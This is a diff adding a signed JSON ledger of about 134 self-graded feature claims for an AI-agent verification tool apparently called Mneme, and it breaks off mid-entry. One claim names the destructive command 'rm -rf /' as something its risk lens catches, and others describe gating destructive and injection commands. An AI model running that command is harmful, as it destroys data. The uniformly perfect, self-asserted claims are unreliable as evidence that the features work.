@@ -1,0 +1,1237 @@
+{
+  "v": 1,
+  "alg": "ed25519",
+  "kind": "generic",
+  "subject": "mneme-honesty-ledger@3.143.0",
+  "payloadHash": "2b372c068fe98d06896fcc2ae0942012d49389b588eeae62a2481aa1f55e36da",
+  "payload": {
+    "spec": "MNEME-HONESTY-LEDGER",
+    "v": 1,
+    "version": "3.143.0",
+    "generatedAt": "2026-06-23T07:04:01.782Z",
+    "summary": {
+      "total": 134,
+      "pass": 134,
+      "drift": 0,
+      "refuted": 0,
+      "unmeasured": 0,
+      "measured": 134,
+      "score": 100,
+      "honest": true
+    },
+    "claims": [
+      {
+        "id": "claim.pulse.whisper_not_nag",
+        "text": "ETHOS (docs/ALETHEIA.md §XI) is the rarest gem — character, proven only over time, that no vendor under engagement pressure can hold. It cannot ship in a release; the one thing that CAN be done from it is SUBTRACTION. The first ETHOS action",
+        "source": "v2.94.0 — ETHOS §XI · whisper, don't nag",
+        "probeId": "probe.pulse.whisper_not_nag",
+        "severity": "block",
+        "verdict": "pass",
+        "reason": "asserted = 1; measured 1"
+      },
+      {
+        "id": "claim.aletheia.diakrisis",
+        "text": "DIAKRISIS is the savant's SECOND axis, orthogonal to truth: Aletheia judges true-vs-false; Diakrisis judges genuine-vs-merely-good-looking (a mediocre artifact is not FALSE, it is unremarkable). As AI commoditises execution AND ideas, the b",
+        "source": "v2.92.0 — DIAKRISIS · the discernment axis",
+        "probeId": "probe.aletheia.diakrisis",
+        "severity": "block",
+        "verdict": "pass",
+        "reason": "asserted = 1; measured 1"
+      },
+      {
+        "id": "claim.aletheia.anamnesis",
+        "text": "ANAMNESIS is the memoization cache for TRUTH across the AI multiverse: the first AI to PROVE a fact pays the inference; every AI after re-verifies the Ed25519-signed lineage (a hash + signature check) instead of re-deriving (full inference)",
+        "source": "v2.91.0 — ANAMNESIS · the energy layer of truth",
+        "probeId": "probe.aletheia.anamnesis",
+        "severity": "block",
+        "verdict": "pass",
+        "reason": "asserted = 1; measured 1"
+      },
+      {
+        "id": "claim.aletheia.savant_diamonds",
+        "text": "The savant becomes the backbone of the AI multiverse via four diamonds, all real + usable by agents and humans: ② SYMBIOSIS — `repairDraft` hands an LLM back a fact-checked draft (FALSE claims corrected with evidence, UNKNOWN claims flagged",
+        "source": "v2.90.0 — Savant Symbiosis · Idle Compounding · Public Gauntlet · Truth Mesh",
+        "probeId": "probe.aletheia.savant_diamonds",
+        "severity": "block",
+        "verdict": "pass",
+        "reason": "asserted = 1; measured 1"
+      },
+      {
+        "id": "claim.aletheia.axiom_lattice",
+        "text": "The Axiom Lattice turns ALETHEIA from a stateless verdict function into a persistent, hash-chained, Ed25519-signed proof graph — the memory backbone any agent can append to, query, and verify OFFLINE. Three savant superpowers no LLM has str",
+        "source": "v2.89.0 — ALETHEIA Axiom Lattice (the savant's memory backbone)",
+        "probeId": "probe.aletheia.axiom_lattice",
+        "severity": "block",
+        "verdict": "pass",
+        "reason": "asserted = 1; measured 1"
+      },
+      {
+        "id": "claim.aletheia.prove_or_unknown",
+        "text": "ALETHEIA is the savant prosthesis for the LLM's structural hallucination/forgetting disability: it consolidates Mneme's truth-family sensors into ONE 3-valued assertion channel — TRUE / FALSE / UNKNOWN — under a HARD discipline. If it canno",
+        "source": "v2.88.0 — ALETHEIA savant spine",
+        "probeId": "probe.aletheia.prove_or_unknown",
+        "severity": "block",
+        "verdict": "pass",
+        "reason": "asserted = 1; measured 1"
+      },
+      {
+        "id": "claim.hephaestus.tribunal_and_preflight",
+        "text": "HEPHAESTUS's destructive-command TRIBUNAL is now backed by REAL cross-vendor judgment (makeDiffArenaTribunal over diff_arena): each vendor judges independently, a split/danger consensus BLOCKs the command, an unparseable/refusal reply count",
+        "source": "v2.87.0 — real cross-vendor tribunal + pre-flight",
+        "probeId": "probe.hephaestus.tribunal_and_preflight",
+        "severity": "block",
+        "verdict": "pass",
+        "reason": "asserted = 1; measured 1"
+      },
+      {
+        "id": "claim.gephyra.mcp_tool_routing",
+        "text": "GEPHYRA routes ANY MCP tool call through truth-customs (routeToolCall): a shell/command-shaped call crosses the HEPHAESTUS lane (risk/policy/tribunal gate — destructive gated, injection blocked, read allowed), a claim-bearing call crosses t",
+        "source": "v2.87.0 — GEPHYRA Phase 4 (MCP tool-call routing)",
+        "probeId": "probe.gephyra.mcp_tool_routing",
+        "severity": "block",
+        "verdict": "pass",
+        "reason": "asserted = 1; measured 1"
+      },
+      {
+        "id": "claim.hephaestus.destructive_gate",
+        "text": "HEPHAESTUS is GEPHYRA's OS lane: a command crossing into the machine is risk-classified (read/write/destructive), policy- and tribunal-gated, output-immune-scanned, and recorded as a signed tamper-evident provenance frame (human vs which AI",
+        "source": "v2.86.0 — HEPHAESTUS",
+        "probeId": "probe.hephaestus.destructive_gate",
+        "severity": "block",
+        "verdict": "pass",
+        "reason": "asserted = 1; measured 1"
+      },
+      {
+        "id": "claim.gephyra.serve_and_auto_advertise",
+        "text": "GEPHYRA serves as an HTTP endpoint (handleCrossRequest: 200 on a valid crossing — a 2+2=5 claim is CORRECTED via the arithmetic backstop — 400 on bad input, never throws) and AUTO-ADVERTISES: newCapabilitiesSince diffs the live catalog agai",
+        "source": "v2.84.0 — GEPHYRA Phase 2",
+        "probeId": "probe.gephyra.serve_and_auto_advertise",
+        "severity": "block",
+        "verdict": "pass",
+        "reason": "asserted = 1; measured 1"
+      },
+      {
+        "id": "claim.gephyra.toll_booth_of_truth",
+        "text": "GEPHYRA is the first bridge that inspects the TRUTH of what crosses it in real time and stamps a tamper-evident receipt. A claim crossing the bridge gets truth-customs: a REFUTED claim is CORRECTED before delivery, an injection/collusion me",
+        "source": "v2.83.0 — GEPHYRA",
+        "probeId": "probe.gephyra.toll_booth_of_truth",
+        "severity": "block",
+        "verdict": "pass",
+        "reason": "asserted = 1; measured 1"
+      },
+      {
+        "id": "claim.truth_stake.slash_on_refute_in_window",
+        "text": "Truth-Staking fuses payment × verification × time-lock: a stake behind a claim is SLASHED iff the claim is refuted within the time-lock window, RETURNED if it survives unrefuted, PENDING inside the window; a late refutation does not slash (",
+        "source": "v2.82.0 — TRUTH-STAKING (💎6)",
+        "probeId": "probe.truth_stake.slash_on_refute_in_window",
+        "severity": "block",
+        "verdict": "pass",
+        "reason": "asserted = 1; measured 1"
+      },
+      {
+        "id": "claim.mesh_immune.contagion_quarantine",
+        "text": "The Mesh Immune System is a cross-agent firewall: it quarantines prompt-injection / collusion / self-replication messages and propagates the infection downstream (a poisoned A2A hop quarantines every later hop — closing the agent-supply-cha",
+        "source": "v2.82.0 — MESH IMMUNE SYSTEM (💎7)",
+        "probeId": "probe.mesh_immune.contagion_quarantine",
+        "severity": "block",
+        "verdict": "pass",
+        "reason": "asserted = 1; measured 1"
+      },
+      {
+        "id": "claim.bgp_router.notarized_route_verifies",
+        "text": "The BGP notarizing router routes a request across protocol boundaries (MCP↔A2A↔x402↔ERC-8004) signing EVERY hop as a prev-chained NOTARY receipt; verifyRoute confirms OFFLINE that every hop signs, the chain is intact, and the protocols actu",
+        "source": "v2.82.0 — BGP NOTARIZING ROUTER (💎1)",
+        "probeId": "probe.bgp_router.notarized_route_verifies",
+        "severity": "block",
+        "verdict": "pass",
+        "reason": "asserted = 1; measured 1"
+      },
+      {
+        "id": "claim.byob.portable_capsule_crdt",
+        "text": "BYOB is a user-owned, Ed25519-signed memory capsule any vendor can load + write back, tamper-evident (a secret edit breaks the signature). Its CRDT merge (union by item id, last-write-wins by ts, vendors unioned) is commutative + idempotent",
+        "source": "v2.82.0 — BYOB portable brain (💎2)",
+        "probeId": "probe.byob.portable_capsule_crdt",
+        "severity": "block",
+        "verdict": "pass",
+        "reason": "asserted = 1; measured 1"
+      },
+      {
+        "id": "claim.truth_cdn.signed_fact_invalidation",
+        "text": "The Live Truth CDN is a federated fact-invalidation feed that overrides training cutoff: observing a fact change emits a signed invalidation that any subscriber verifies offline + applies if newer; stale and forged invalidations are ignored",
+        "source": "v2.82.0 — LIVE TRUTH CDN (💎8)",
+        "probeId": "probe.truth_cdn.signed_fact_invalidation",
+        "severity": "block",
+        "verdict": "pass",
+        "reason": "asserted = 1; measured 1"
+      },
+      {
+        "id": "claim.edge_mesh.signed_peer_cards",
+        "text": "The Sovereign Edge Mesh is a cloud-free, local-first agent mesh: peer cards carry LAN-only endpoints, are Ed25519-signed + verify offline (tampering fails), and gossip-merge dedups by peer (latest issuedAt wins) while dropping forged cards.",
+        "source": "v2.82.0 — SOVEREIGN EDGE MESH (💎9)",
+        "probeId": "probe.edge_mesh.signed_peer_cards",
+        "severity": "block",
+        "verdict": "pass",
+        "reason": "asserted = 1; measured 1"
+      },
+      {
+        "id": "claim.idle_compound.consolidate_axioms",
+        "text": "Idle-Time Compounding turns idle time into compounding advantage: near-duplicate verified TRUE claims consolidate into fewer higher-support axioms, FALSE claims contradicting an axiom are pruned, UNVERIFIED claims are not promoted, and the ",
+        "source": "v2.82.0 — IDLE-TIME COMPOUNDING (💎10)",
+        "probeId": "probe.idle_compound.consolidate_axioms",
+        "severity": "block",
+        "verdict": "pass",
+        "reason": "asserted = 1; measured 1"
+      },
+      {
+        "id": "claim.honesty.portable_signed_score",
+        "text": "Mneme issues a PORTABLE honesty score — the axis ERC-8004 reputation never touches ('does the agent tell the TRUTH?'). It is a Wilson 95% LOWER bound on an agent's verified true-rate (small/under-measured agents score low by design — reputa",
+        "source": "v2.81.0 release notes — HONESTY CREDIT SCORE (💎5, on the NOTARY spine)",
+        "probeId": "probe.honesty.portable_signed_score",
+        "severity": "block",
+        "verdict": "pass",
+        "reason": "asserted = 1; measured 1"
+      },
+      {
+        "id": "claim.flight_recorder.tamper_evident_replay",
+        "text": "Mneme's AI Flight Recorder is a tamper-evident, replayable black box built on the NOTARY spine: every recorded frame is an Ed25519-signed, chained receipt, so the whole cockpit-data-recorder verifies OFFLINE by any third party (court / insu",
+        "source": "v2.80.0 release notes — FLIGHT RECORDER (💎3, on the NOTARY spine)",
+        "probeId": "probe.flight_recorder.tamper_evident_replay",
+        "severity": "block",
+        "verdict": "pass",
+        "reason": "asserted = 1; measured 1"
+      },
+      {
+        "id": "claim.notary.portable_offline_verify",
+        "text": "Mneme issues Ed25519-signed proof receipts that a third party verifies OFFLINE with only the embedded public key — no Mneme instance, no network, no shared secret. This is Mneme's first asymmetric-crypto primitive (every prior ledger is HMA",
+        "source": "v2.79.0 release notes — NOTARY (TRUST FABRIC spine)",
+        "probeId": "probe.notary.sign_verify_round_trip",
+        "severity": "block",
+        "verdict": "pass",
+        "reason": "asserted = 1; measured 1"
+      },
+      {
+        "id": "claim.immune.no_worm_directive",
+        "text": "Mneme never injects an AI-worm directive into a persistent agent-instruction file. The block written to CLAUDE.md/AGENTS.md/.cursorrules/.windsurfrules carries zero worm signatures (no imperative addressed to the AI, no auto-exec tool call,",
+        "source": "v2.78.0 release notes — DE-WORM + WORM-CANARY",
+        "probeId": "probe.immune.no_worm_directive",
+        "severity": "block",
+        "verdict": "pass",
+        "reason": "asserted = 1; measured 1"
+      },
+      {
+        "id": "claim.chronos.four_verdict_classification",
+        "text": "CHRONOS measures honesty WITHOUT a ground-truth oracle by detecting self-contradiction across time. On the canonical scenario it classifies all four temporal verdicts correctly: same stance → COHERENT; stance changed WITH new cited evidence",
+        "source": "v2.74.0 release notes — CHRONOS",
+        "probeId": "probe.chronos.four_verdict_round_trip",
+        "severity": "block",
+        "verdict": "pass",
+        "reason": "asserted = 1; measured 1"
+      },
+      {
+        "id": "claim.chronos.ledger_chain_intact",
+        "text": "The CHRONOS temporal ledger is HMAC-chained — every recorded answer's HMAC depends on the previous row. Deleting or editing a past answer to hide a contradiction breaks the chain. Tamper-evident temporal-honesty history; same canonical-JSON",
+        "source": "v2.74.0 release notes — CHRONOS",
+        "probeId": "probe.chronos.ledger_chain_intact",
+        "severity": "block",
+        "verdict": "pass",
+        "reason": "asserted = 1; measured 1"
+      },
+      {
+        "id": "claim.bridge.rate_limit_burst_guard",
+        "text": "HTTP bridge rate limit has a per-SECOND burst cap in addition to per-minute. A sub-second flood (e.g. 100 requests in <1s on the polygraph route) is capped at 25/sec — exactly 25 pass, the rest get 429. Pre-v2.73 only a 600/min window exist",
+        "source": "v2.73.0 release notes — vuln #1 closure",
+        "probeId": "probe.bridge.rate_limit_burst_guard",
+        "severity": "block",
+        "verdict": "pass",
+        "reason": "asserted true; measured true"
+      },
+      {
+        "id": "claim.polygraph.homograph_canonical_http_path",
+        "text": "The HTTP polygraph path (verifyBrowserSentence) canonicalizes Unicode-digit homographs (Arabic-Indic ٢, fullwidth ２, etc) to ASCII via the HOMOGRAPH GUARD in the SHARED core engine — so '٢+٢=٥' is refuted by the math lens exactly as '2+2=5'",
+        "source": "v2.73.0 release notes — vuln #2 closure",
+        "probeId": "probe.polygraph.homograph_canonical_http_path",
+        "severity": "block",
+        "verdict": "pass",
+        "reason": "asserted true; measured true"
+      },
+      {
+        "id": "claim.polygraph.lenses_always_run",
+        "text": "The polygraph runs all 6 micro-lenses on EVERY non-empty sentence (on the canonical form), even generic/short claims that the heavy-ACGV prefilter skips. A claim hiding 'rm -rf /' or a wrong equation is caught by the risk/math lens regardle",
+        "source": "v2.73.0 release notes — vuln #3 closure",
+        "probeId": "probe.polygraph.lenses_always_run",
+        "severity": "block",
+        "verdict": "pass",
+        "reason": "asserted true; measured true"
+      },
+      {
+        "id": "claim.protoplasm.wal_survives_sigkill",
+        "text": "PROTOPLASM WAL ledger survives SIGKILL — state persists to disk before RAM update; new process can replay baselines from .mneme/protoplasm/wal.jsonl after uncatchable kill",
+        "source": "v2.67.0 release notes",
+        "probeId": "probe.protoplasm.wal_chain_valid",
+        "severity": "block",
+        "verdict": "pass",
+        "reason": "asserted true; measured true"
+      },
+      {
+        "id": "claim.protoplasm.seamless_boot_zero_config",
+        "text": "PROTOPLASM seamless boot — atom activates on any Mneme tool call without user config; heartbeat.json written automatically",
+        "source": "v2.67.0 release notes",
+        "probeId": "probe.protoplasm.heartbeat_present_or_first_run",
+        "severity": "warn",
+        "verdict": "pass",
+        "reason": "asserted true; measured true"
+      },
+      {
+        "id": "claim.tokens.capabilities_lt_25k",
+        "text": "Mneme keeps mneme.capabilities response under 25K bytes (skinny default)",
+        "source": "README · positioning",
+        "probeId": "probe.capabilities.bytes",
+        "severity": "block",
+        "verdict": "pass",
+        "reason": "asserted < 25000 bytes; measured 3723"
+      },
+      {
+        "id": "claim.tokens.capabilities_tokens_lt_8k",
+        "text": "Default mneme.capabilities response is under ~8K tokens (was 80K before v2.26)",
+        "source": "README · positioning",
+        "probeId": "probe.capabilities.tokens",
+        "severity": "block",
+        "verdict": "pass",
+        "reason": "asserted < 8000 tokens; measured 931"
+      },
+      {
+        "id": "claim.verifier.at_least_9_agents",
+        "text": "Mneme runs at least 9 verification agents in parallel",
+        "source": "README · ACGV pipeline section",
+        "probeId": "probe.verifier.agent_count",
+        "severity": "warn",
+        "verdict": "pass",
+        "reason": "asserted >= 9 agents; measured 13"
+      },
+      {
+        "id": "claim.supernova.in_band_only",
+        "text": "SUPERNOVA tracks daemon restart cycles IN-BAND only; cross-process respawn requires `mneme autoboot install`",
+        "source": "v2.27.0 honest correction (was: SUPERNOVA auto-respawn)",
+        "probeId": "probe.supernova.auto_respawn",
+        "severity": "warn",
+        "verdict": "pass",
+        "reason": "asserted false; measured false"
+      },
+      {
+        "id": "claim.phoenix.opt_in",
+        "text": "Phoenix Resurrection mechanisms (schtasks/startupFolder/registryRun) are AVAILABLE but require `mneme autoboot install`",
+        "source": "v2.27.0 honest correction (was: Phoenix installs by default)",
+        "probeId": "probe.phoenix.activates_by_default",
+        "severity": "warn",
+        "verdict": "pass",
+        "reason": "asserted false; measured false"
+      },
+      {
+        "id": "claim.embedder.ollama_when_available",
+        "text": "When Ollama is running, Mneme picks the Ollama embedder (★★★★) not Bundled (★★★)",
+        "source": "doctor + embeddings status",
+        "probeId": "probe.embedder.tier",
+        "severity": "block",
+        "verdict": "pass",
+        "reason": "live = ollama:nomic-embed-text"
+      },
+      {
+        "id": "claim.audit_log.opt_in",
+        "text": "Audit-log is OPT-IN for SOC2/PCI-DSS; enable with `mneme audit-log enable` per the consent-fabric Bill of Rights",
+        "source": "v2.27.0 honest correction (was: enabled by default)",
+        "probeId": "probe.audit_log.enabled_by_default",
+        "severity": "info",
+        "verdict": "pass",
+        "reason": "asserted false; measured false"
+      },
+      {
+        "id": "claim.gauntlet.perfect_score",
+        "text": "PEAK GAUNTLET self-grade is 100/100",
+        "source": "v2.26.1 release notes",
+        "probeId": "probe.peak_gauntlet.overall",
+        "severity": "block",
+        "verdict": "pass",
+        "reason": "asserted = 100 score; measured 100"
+      },
+      {
+        "id": "claim.stderr.structured_log",
+        "text": "Server emits structured stderr log (≥ 200 bytes per session)",
+        "source": "v2.24.0 M16 fix",
+        "probeId": "probe.stderr.session_bytes",
+        "severity": "warn",
+        "verdict": "pass",
+        "reason": "asserted >= 200 bytes; measured 522"
+      },
+      {
+        "id": "claim.tool_count.at_least_800",
+        "text": "Mneme catalog has at least 800 tools",
+        "source": "Catalog growth doc",
+        "probeId": "probe.tool_count",
+        "severity": "info",
+        "verdict": "pass",
+        "reason": "asserted >= 800 tools; measured 1132"
+      },
+      {
+        "id": "claim.rewind.card_count_known",
+        "text": "REWIND VendorRegressionCard ledger exists (or is honestly empty on first install)",
+        "source": "v2.31.0 release notes",
+        "probeId": "probe.rewind.card_count",
+        "severity": "info",
+        "verdict": "pass",
+        "reason": "asserted >= 0 cards; measured 0"
+      },
+      {
+        "id": "claim.hgp.registry_size_known",
+        "text": "HGP local registry has a non-negative count of distinct HGP-IDs (zero on first install is honest)",
+        "source": "v2.31.0 release notes",
+        "probeId": "probe.hgp.registry_size",
+        "severity": "info",
+        "verdict": "pass",
+        "reason": "asserted >= 0 ids; measured 38"
+      },
+      {
+        "id": "claim.hgp.federation_default_off",
+        "text": "HGP federation is opt-in / private-by-default (CONSENT FABRIC)",
+        "source": "v2.31.0 release notes",
+        "probeId": "probe.hgp.federation_default_off",
+        "severity": "block",
+        "verdict": "pass",
+        "reason": "asserted = 0 boolean; measured 0"
+      },
+      {
+        "id": "claim.flywheel.health_known",
+        "text": "FLYWHEEL self-audit health is a known non-negative number on first install (or improves to ≥ 0 after first run)",
+        "source": "v2.32.0 release notes",
+        "probeId": "probe.flywheel.health",
+        "severity": "info",
+        "verdict": "pass",
+        "reason": "asserted >= 0 score; measured 100"
+      },
+      {
+        "id": "claim.citizen_court.verdict_count_known",
+        "text": "CITIZEN COURT verdict ledger reports a non-negative count (zero on fresh install is honest)",
+        "source": "v2.33.0 release notes",
+        "probeId": "probe.citizen_court.verdict_count",
+        "severity": "info",
+        "verdict": "pass",
+        "reason": "asserted >= 0 verdicts; measured 0"
+      },
+      {
+        "id": "claim.mnemnet.federation_default_off",
+        "text": "MNEMNET federation is opt-in / private-by-default (CONSENT FABRIC)",
+        "source": "v2.33.0 release notes",
+        "probeId": "probe.mnemnet.federation_default_off",
+        "severity": "block",
+        "verdict": "pass",
+        "reason": "asserted = 0 boolean; measured 0"
+      },
+      {
+        "id": "claim.nemesis.world_first",
+        "text": "NEMESIS is the world's first Anti-Identity-Lie Engine for AI coding agents — fingerprints 5 vendors (Codex/Claude Code/Copilot/Cursor/Devin) with HMAC verdicts + auto-stamps EU AI Act Article 50 disclosure",
+        "source": "v2.46.0 release notes",
+        "probeId": "probe.nemesis.world_first_agent_fingerprinter",
+        "severity": "block",
+        "verdict": "pass",
+        "reason": "asserted = 1 boolean; measured 1"
+      },
+      {
+        "id": "claim.activity.vendor_field_never_embedder",
+        "text": "cli-activity.jsonl vendor field NEVER contains embedder/backend names (ollama / openai / gemini / etc) — VENDOR ALLOWLIST GUARD catches at write time",
+        "source": "v2.50.0 release notes",
+        "probeId": "probe.activity.vendor_field_never_embedder",
+        "severity": "block",
+        "verdict": "pass",
+        "reason": "asserted = 1 boolean; measured 1"
+      },
+      {
+        "id": "claim.wiring.doctor_all_features_healthy",
+        "text": "WIRING DOCTOR primitive asserts every recent Mneme primitive (LETHE / GAVEL / NIMBUS / JANUS / STARGATE / DRAGON / LAUNCH WINDOW / STEALTH / CAPILLARY / COLOSSEUM / MOLT / THEMIS / SIBYL — 13 total) has full surface coverage across core exp",
+        "source": "v2.57.0 release notes",
+        "probeId": "probe.wiring.doctor_all_features_healthy",
+        "severity": "block",
+        "verdict": "pass",
+        "reason": "asserted = 1 boolean; measured 1"
+      },
+      {
+        "id": "claim.wiring.lag_extractor_no_false_positives",
+        "text": "wiring_lag extractor REJECTS natural prose ('Mneme is the X' / 'Mneme ships Y' / 'Mneme inside cursor') and ONLY accepts backtick-wrapped (`mneme verify`) or explicit-marker (`$ mneme verify` / `Run: mneme verify`) patterns. 50+ English sto",
+        "source": "v2.57.0 release notes",
+        "probeId": "probe.wiring.lag_extractor_no_false_positives",
+        "severity": "block",
+        "verdict": "pass",
+        "reason": "asserted = 1 boolean; measured 1"
+      },
+      {
+        "id": "claim.coverage.smart_auto_exemption",
+        "text": "probe_coverage gate auto-exempts tools matching read-only patterns (*.status / *.list / *.show / *.report / *.verify / *.chain / *.help / *.about / *.info / *.read / *.ask / *.why / *.search / *.find / *.history / *.pulse — 25+ patterns). B",
+        "source": "v2.57.0 release notes",
+        "probeId": "probe.coverage.smart_auto_exemption",
+        "severity": "block",
+        "verdict": "pass",
+        "reason": "asserted = 1 boolean; measured 1"
+      },
+      {
+        "id": "claim.reflog.checkpoint_rewind_round_trip",
+        "text": "REFLOG round-trips on a fresh temp repo: 2 HMAC-signed per-file checkpoints with AI pheromone tag around a file edit, rewindPreview returns toRevert containing exactly the edited file with target SHA matching cp1, valid HMAC envelope. Time-",
+        "source": "v2.66.0 release notes",
+        "probeId": "probe.reflog.checkpoint_rewind_round_trip",
+        "severity": "block",
+        "verdict": "pass",
+        "reason": "asserted = 1 boolean; measured 1"
+      },
+      {
+        "id": "claim.reflog.ledger_chain_intact",
+        "text": "REFLOG ledger is HMAC-chained — every checkpoint + rewind_preview row's HMAC depends on previous row's HMAC. Same canonical-JSON convention as PASSPORT/MIRRAGE/TIME-CRYSTAL/DIFF-ARENA/SWARM-BUS. Tamper-evident time-machine history",
+        "source": "v2.66.0 release notes",
+        "probeId": "probe.reflog.ledger_chain_intact",
+        "severity": "block",
+        "verdict": "pass",
+        "reason": "asserted = 1 boolean; measured 1"
+      },
+      {
+        "id": "claim.swarm_bus.broadcast_drain_handoff",
+        "text": "SWARM BUS cross-agent message bus round-trips end-to-end: 2 agents subscribe → 1 broadcasts → other drains → message HMAC verifies → handoff narrative renders the Claude→Cursor chain with HMAC proof per step. First vendor-agnostic multi-age",
+        "source": "v2.65.0 release notes",
+        "probeId": "probe.swarm_bus.broadcast_drain_handoff",
+        "severity": "block",
+        "verdict": "pass",
+        "reason": "asserted = 1 boolean; measured 1"
+      },
+      {
+        "id": "claim.swarm_bus.ledger_chain_intact",
+        "text": "SWARM BUS bus ledger is HMAC-chained — every subscribe + broadcast + drain row's HMAC depends on previous row's HMAC. Tamper-evident audit of every cross-agent handoff",
+        "source": "v2.65.0 release notes",
+        "probeId": "probe.swarm_bus.ledger_chain_intact",
+        "severity": "block",
+        "verdict": "pass",
+        "reason": "asserted = 1 boolean; measured 1"
+      },
+      {
+        "id": "claim.diff_arena.consensus_round_trip",
+        "text": "DIFFERENTIAL ARENA orchestrates parallel multi-vendor asks + computes 4-axis consensus (Jaccard bigram + numeric agreement + sentiment + length) + identifies outliers correctly on the canonical fixture (Claude+GPT agree on 'removed legacy c",
+        "source": "v2.64.0 release notes",
+        "probeId": "probe.diff_arena.consensus_round_trip",
+        "severity": "block",
+        "verdict": "pass",
+        "reason": "asserted = 1 boolean; measured 1"
+      },
+      {
+        "id": "claim.diff_arena.ledger_chain_intact",
+        "text": "DIFFERENTIAL ARENA rounds ledger is HMAC-chained — every ask + per-vendor-response row's HMAC depends on previous row's HMAC. Tamper-evident audit of every multi-vendor round",
+        "source": "v2.64.0 release notes",
+        "probeId": "probe.diff_arena.ledger_chain_intact",
+        "severity": "block",
+        "verdict": "pass",
+        "reason": "asserted = 1 boolean; measured 1"
+      },
+      {
+        "id": "claim.time_crystal.fingerprint_clusters",
+        "text": "TIME-CRYSTAL canonical problem fingerprinting clusters synonym phrasings via entity slotting (PKG/VER/PATH/HASH/TSERR) + stop-word filter + token sort + SHA-256. Two agents typing 'Cannot find module @types/node' and 'TypeScript Error TS230",
+        "source": "v2.63.0 release notes",
+        "probeId": "probe.time_crystal.fingerprint_clusters",
+        "severity": "block",
+        "verdict": "pass",
+        "reason": "asserted = 1 boolean; measured 1"
+      },
+      {
+        "id": "claim.time_crystal.contribute_lookup_round_trip",
+        "text": "TIME-CRYSTAL contribute → lookup round-trip works end-to-end on a fresh temp ledger: 3 contributions across 2 approaches produce a ranked LookupResult with ≥1 approach + auto-detected gotcha (where applicable) + valid HMAC envelope + intact",
+        "source": "v2.63.0 release notes",
+        "probeId": "probe.time_crystal.contribute_lookup_round_trip",
+        "severity": "block",
+        "verdict": "pass",
+        "reason": "asserted = 1 boolean; measured 1"
+      },
+      {
+        "id": "claim.mirrage.scans_with_nudges",
+        "text": "MIRRAGE detects refutable claims in agent drafts via lightweight heuristic (hedge density - absolute density + entity density). On the synthetic 'React 19 always ships server components by default' fixture, at least one nudge fires at sugge",
+        "source": "v2.62.0 release notes",
+        "probeId": "probe.mirrage.scans_with_nudges",
+        "severity": "block",
+        "verdict": "pass",
+        "reason": "asserted = 1 boolean; measured 1"
+      },
+      {
+        "id": "claim.mirrage.ledger_chain_intact",
+        "text": "MIRRAGE nudge ledger is HMAC-chained — every scan + ack + broadcast row's HMAC depends on the previous row's HMAC. Tamper-evident; court-admissible record of what the agent was warned about + when",
+        "source": "v2.62.0 release notes",
+        "probeId": "probe.mirrage.ledger_chain_intact",
+        "severity": "block",
+        "verdict": "pass",
+        "reason": "asserted = 1 boolean; measured 1"
+      },
+      {
+        "id": "claim.passport.issue_verify_revoke_round_trip",
+        "text": "PASSPORT capability-based security primitive: issuePassport with high trust returns HMAC-signed token + correct TTL → verifyPassport reports valid → revokePassport with cascade=true succeeds → re-verify reports revoked. End-to-end round-tri",
+        "source": "v2.61.0 release notes",
+        "probeId": "probe.passport.issue_verify_revoke_round_trip",
+        "severity": "block",
+        "verdict": "pass",
+        "reason": "asserted = 1 boolean; measured 1"
+      },
+      {
+        "id": "claim.passport.ledger_chain_intact",
+        "text": "PASSPORT audit ledger is HMAC-chained — every issue/verify/revoke entry's HMAC depends on the previous row's HMAC. Tamper-evident; chain verification can detect any mid-stream edit. Court-admissible audit trail",
+        "source": "v2.61.0 release notes",
+        "probeId": "probe.passport.ledger_chain_intact",
+        "severity": "block",
+        "verdict": "pass",
+        "reason": "asserted = 1 boolean; measured 1"
+      },
+      {
+        "id": "claim.skeleton_key.audit_runs",
+        "text": "SKELETON KEY (the first MCP server security auditor) runs end-to-end: discovers MCP servers across Claude Desktop / Cursor / Continue / Cline configs, scores per-server risk with CWE mapping, computes transitive bypass graph + risk budget, ",
+        "source": "v2.60.0 release notes",
+        "probeId": "probe.skeleton_key.audit_runs",
+        "severity": "block",
+        "verdict": "pass",
+        "reason": "asserted = 1 boolean; measured 1"
+      },
+      {
+        "id": "claim.skeleton_key.bypass_graph_works",
+        "text": "SKELETON KEY's transitive bypass graph derives multi-server attack paths from capability overlap. Fixture: 3 servers (shell-mcp / filesystem-mcp / github-mcp) → ≥3 distinct attacker-goal bypass paths (delete_repo, modify_ci_pipeline, exfilt",
+        "source": "v2.60.0 release notes",
+        "probeId": "probe.skeleton_key.bypass_graph_works",
+        "severity": "block",
+        "verdict": "pass",
+        "reason": "asserted = 1 boolean; measured 1"
+      },
+      {
+        "id": "claim.sdk.external_surface_complete",
+        "text": "@mneme-ai/sdk's external public surface (what `import { ... } from \"@mneme-ai/sdk\"` returns) has every expected feature: standalone `letheForget` / `gavelPack` / `nimbusPublish` functions + convenience groups `lethe` / `gavel` / `nimbus` + ",
+        "source": "v2.59.0 release notes",
+        "probeId": "probe.sdk.external_surface_complete",
+        "severity": "block",
+        "verdict": "pass",
+        "reason": "asserted = 1 boolean; measured 1"
+      },
+      {
+        "id": "claim.gate.consistency",
+        "text": "WIRING DOCTOR and SDK_AUDITOR agree on every feature. Pre-v2.59 WIRING DOCTOR reported '13/13 wired' but external `import { letheForget } from \"@mneme-ai/sdk\"` was undefined (gate checked internal class file instead of external surface). v2",
+        "source": "v2.59.0 release notes",
+        "probeId": "probe.gate.consistency",
+        "severity": "block",
+        "verdict": "pass",
+        "reason": "asserted = 1 boolean; measured 1"
+      },
+      {
+        "id": "claim.living_lab.no_open_findings",
+        "text": "LIVING LAB findings ledger (HMAC-chained) has 0 OPEN findings AND chain integrity verifies. Open finding = a tool that previously passed AUTOPROBE but now fails on the latest LIVING LAB tick. Open findings BLOCK the next release until clear",
+        "source": "v2.58.0 release notes",
+        "probeId": "probe.living_lab.no_open_findings",
+        "severity": "block",
+        "verdict": "pass",
+        "reason": "asserted = 1 boolean; measured 1"
+      },
+      {
+        "id": "claim.xai.grok_first_class",
+        "text": "Mneme treats Grok (xAI's coding agent) as a first-class vendor: in AGENT_VENDOR_ALLOWLIST + removed from EMBEDDER_LEAK_SIGNATURES + classifier signature added + 15 seed-corpus fixtures + env_scan markers (GROK_API_KEY / XAI_API_KEY / GROK_C",
+        "source": "v2.56.0 release notes",
+        "probeId": "probe.xai.grok_first_class",
+        "severity": "block",
+        "verdict": "pass",
+        "reason": "asserted = 1 boolean; measured 1"
+      },
+      {
+        "id": "claim.xai.launch_window_ready",
